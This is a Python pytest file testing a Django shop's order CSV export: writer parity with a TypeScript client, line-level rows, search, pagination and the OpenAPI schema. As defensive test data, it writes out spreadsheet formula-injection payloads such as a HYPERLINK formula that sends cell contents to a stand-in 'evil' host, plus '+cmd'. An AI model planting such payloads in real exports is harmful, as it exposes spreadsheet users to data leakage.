"""FR-R005 — canonical CSV export tests (ROADLOG R-005, docs/csv-export.md).

Two layers, deliberately tested differently:

1. The WRITER (pure, no DB): csv_text/csv_cell must emit exactly what
   app/src/lib/csv.ts emits for the same cells — the vitest suite in
   app/src/lib/__tests__/csv.test.ts pins the identical strings, so the two
   halves of the contract are held to one byte-level spec (QUOTE_MINIMAL,
   CRLF, RFC 4180 doubled quotes, empty for null, lowercase booleans,
   formula guard on text only).
2. The ENDPOINT GET /api/orders/export/ — line-level (child rows with the
   parent ids repeated), whole collection, primary-key order, ?search=
   honoured, pagination ignored, text/csv + attachment + UTF-8 BOM, and the
   OpenAPI shape the thin client binds its button to.

Infrastructure note (same as test_audit_actions): conftest mounts the demo
rig apps in-memory and scopes the rig URLconf/DRF policy to this module;
the test database comes from Django's own DiscoverRunner — pytest-django is
deliberately not a dependency.
"""
import csv
import io
import json
from decimal import Decimal
from uuid import uuid4

import pytest
from django.contrib.auth.models import User
from django.core.management import call_command
from django.db import transaction
from django.test.runner import DiscoverRunner
from django.test.utils import setup_test_environment, teardown_test_environment
from django.urls import reverse
from rest_framework.test import APIClient

from shop.csv_export import ORDER_EXPORT_HEADER, csv_cell, csv_text
from shop.models import Category, Customer, Order, OrderHistory, Product


# ---------------------------------------------------------------------------
# database plumbing
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def demo_db():
    setup_test_environment()
    runner = DiscoverRunner(interactive=False, verbosity=0)
    old_config = runner.setup_databases()
    yield
    runner.teardown_databases(old_config)
    teardown_test_environment()


@pytest.fixture
def db(demo_db):
    with transaction.atomic():
        yield
        transaction.set_rollback(True)


@pytest.fixture
def api(db):
    return APIClient()


@pytest.fixture
def user(db):
    return User.objects.create_user("exp1", "exp1@example.com", "pw12345")


@pytest.fixture
def auth_api(api, user):
    api.force_authenticate(user=user)
    return api


@pytest.fixture
def order(db):
    return make_order(notes="seeded")


def make_order(**kw):
    """ORM-built order: no history row, created_at NULL — the shapes an
    export has to cope with (a record with no child rows still ships)."""
    cat = Category.objects.create(name=f"cat-{uuid4().hex[:8]}")
    product = Product.objects.create(
        category=cat,
        name=kw.pop("product_name", "Thing"),
        price=Decimal("19.99"),
        stock=5,
    )
    customer = Customer.objects.create(
        name=kw.pop("customer", "Cust"), email=f"{uuid4().hex[:8]}@example.com"
    )
    defaults = {"total": Decimal("0.00"), "status": Order.Status.PENDING}
    defaults.update(kw)
    return Order.objects.create(customer=customer, product=product, **defaults)


def export_url():
    return reverse("order-export")


def read_csv(body: str):
    """Parse a document back with the stdlib reader — the round trip is the test."""
    return list(csv.reader(io.StringIO(body)))


# ---------------------------------------------------------------------------
# 1. the writer, pinned byte for byte against app/src/lib/csv.ts
# ---------------------------------------------------------------------------

class TestCsvWriterParity:
    def test_crlf_and_minimal_quoting(self):
        # csv_text always terminates the document; buildCsv() in the client
        # does the same, so a downloaded file diffs clean against an export.
        assert csv_text([["id", "name"], [1, "a"], [2, "b"]]) == "id,name\r\n1,a\r\n2,b\r\n"

    def test_quotes_on_comma_quote_and_line_breaks(self):
        assert csv_text([["a,b"]]) == '"a,b"\r\n'
        assert csv_text([['say "hi"']]) == '"say ""hi"""\r\n'
        assert csv_text([["line1\nline2"]]) == '"line1\nline2"\r\n'

    def test_whitespace_is_left_bare(self):
        # Probed: Python QUOTE_MINIMAL does not quote padded text, so the TS
        # writer must not either — the two layers have to agree.
        assert csv_text([["  padded  "]]) == "  padded  \r\n"

    def test_null_is_empty_not_a_word(self):
        # The one documented carve-out: Python quotes a row that is exactly one
        # empty field ('""') so the line cannot collapse into nothing. Any
        # reader gives back "" either way, and a real export row is never
        # single-column — multi-column empties come out bare, like buildCsv().
        assert csv_text([[None]]) == '""\r\n'
        assert csv_text([["id", None]]) == "id,\r\n"

    def test_booleans_are_machine_readable(self):
        assert csv_cell(True) == "true"
        assert csv_cell(False) == "false"

    def test_decimal_keeps_its_serial_form(self):
        assert csv_cell(Decimal("19.99")) == "19.99"

    def test_formula_guard_covers_text_but_not_numbers(self):
        assert csv_cell("=HYPERLINK(\"http://evil/\"+A1)").startswith("'=")
        assert csv_cell("+cmd") == "'+cmd"
        assert csv_cell("@SUM(A1)") == "'@SUM(A1)"
        assert csv_cell("-5") == "'-5"
        assert csv_cell(Decimal("-5.00")) == "-5.00"  # a number is a number
        assert csv_cell("normal - dash") == "normal - dash"


# ---------------------------------------------------------------------------
# 2. the endpoint
# ---------------------------------------------------------------------------

class TestExportEndpointBasics:
    def test_url_resolves_under_the_orders_list_path(self):
        assert export_url() == "/api/orders/export/"

    def test_unauthenticated_is_rejected(self, api, db):
        assert api.get(export_url()).status_code == 401

    def test_answers_a_csv_attachment_with_a_bom(self, auth_api, db):
        make_order(notes="first")
        response = auth_api.get(export_url())
        assert response.status_code == 200
        assert response["Content-Type"] == "text/csv; charset=utf-8"
        assert response["Content-Disposition"] == 'attachment; filename="orders-line.csv"'
        body = response.content.decode("utf-8")
        assert body.startswith("\ufeff"), "Excel needs the BOM to read UTF-8"
        assert body.endswith("\r\n") or body.count("\r\n") >= 1
        assert "\r\n" in body, "RFC 4180 line endings"

    def test_header_is_the_documented_column_contract(self, auth_api, db):
        make_order()
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert rows[0] == ORDER_EXPORT_HEADER

    def test_parent_columns_come_first_then_child(self, auth_api, db):
        assert ORDER_EXPORT_HEADER[:9] == [
            "order_id", "customer_id", "customer", "product_id", "product",
            "status", "total", "notes", "created_at",
        ]
        assert ORDER_EXPORT_HEADER[-5] == "history_id", "child block starts after the parent"


class TestLineLevelShape:
    def test_one_row_per_history_entry_with_parent_ids_repeated(self, auth_api, order, user):
        """order fixture came from the API-less ORM (no history), so drive two
        transitions through the R-001 machine and expect the trail flattened."""
        OrderHistory.objects.create(order=order, from_status="", to_status="pending", actor=user)
        OrderHistory.objects.create(order=order, from_status="pending", to_status="paid", actor=user)
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        mine = [r for r in rows[1:] if r and r[0] == str(order.pk)]
        assert len(mine) == 2
        assert mine[0][:9] == mine[1][:9], "parent block must repeat verbatim"
        # creation entry first, then the move: child order is replay order, not
        # insertion order of the join
        assert [r[10] for r in mine] == ["", "pending"]
        assert [r[11] for r in mine] == ["pending", "paid"]
        assert [r[12] for r in mine] == ["exp1", "exp1"], "history_actor is column 12"

    def test_an_order_with_no_history_still_gets_a_row(self, auth_api, order):
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        mine = [r for r in rows[1:] if r and r[0] == str(order.pk)]
        assert len(mine) == 1
        assert mine[0][9:] == ["", "", "", "", ""], "empty child columns, never a dropped record"

    def test_stable_order_is_primary_key_order(self, auth_api, db):
        ids = [make_order(notes=f"n{i}").pk for i in range(3)]
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        exported = [int(r[0]) for r in rows[1:] if r]
        assert exported == sorted(ids), "an export must diff against the next export"


class TestCollectionScope:
    def test_whole_collection_not_one_page(self, auth_api, db):
        for i in range(12):  # PAGE_SIZE is 10
            make_order(notes=f"bulk-{i}")
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert len([r for r in rows[1:] if r]) == 12

    def test_search_filter_is_honoured(self, auth_api, db):
        make_order(notes="alpha-unique")
        make_order(notes="beta-unique")
        rows = read_csv(auth_api.get(export_url(), {"search": "alpha-unique"}).content.decode("utf-8-sig"))
        body = [r for r in rows[1:] if r]
        assert len(body) == 1
        assert body[0][7] == "alpha-unique"

    def test_export_body_carries_no_pagination_wrapper(self, auth_api, db):
        make_order()
        text = auth_api.get(export_url()).content.decode("utf-8-sig")
        assert '"count"' not in text and "results" not in text


class TestCellFidelity:
    def test_rfc4180_round_trip_through_the_stdlib_reader(self, auth_api, order):
        order.notes = 'gift, please\nwrap "nicely"'
        order.save(update_fields=["notes"])
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        cell = [r for r in rows[1:] if r and r[0] == str(order.pk)][0][7]
        assert cell == 'gift, please\nwrap "nicely"'

    def test_decimal_total_is_not_reflowed_through_float(self, auth_api, order):
        order.total = Decimal("19.99")
        order.save(update_fields=["total"])
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][6] == "19.99"

    def test_a_formula_looking_note_is_neutralised(self, auth_api, order):
        order.notes = "=HYPERLINK(\"http://evil/\"+A1)"
        order.save(update_fields=["notes"])
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][7].startswith("'=")

    def test_null_created_at_is_an_empty_field(self, auth_api, order):
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert [r for r in rows[1:] if r and r[0] == str(order.pk)][0][8] == ""

    def test_long_notes_are_never_truncated(self, auth_api, order):
        order.notes = "x" * 300
        order.save(update_fields=["notes"])
        rows = read_csv(auth_api.get(export_url()).content.decode("utf-8-sig"))
        assert len([r for r in rows[1:] if r and r[0] == str(order.pk)][0][7]) == 300


class TestSchemaContract:
    def test_export_path_is_documented_as_get_only_csv(self, tmp_path):
        """The client binds its server-export button from exactly this shape:
        a GET at <listPath>export/ answering text/csv, and NO POST (which
        would make drf-spectacular's path look like a model list endpoint)."""
        out = tmp_path / "schema.json"
        call_command("spectacular", "--format", "openapi-json", file=str(out))
        schema = json.loads(out.read_text())
        path = schema["paths"]["/api/orders/export/"]
        assert set(path.keys()) == {"get"}, path.keys()
        content = path["get"]["responses"]["200"]["content"]
        assert "text/csv" in content
        assert "application/json" not in content
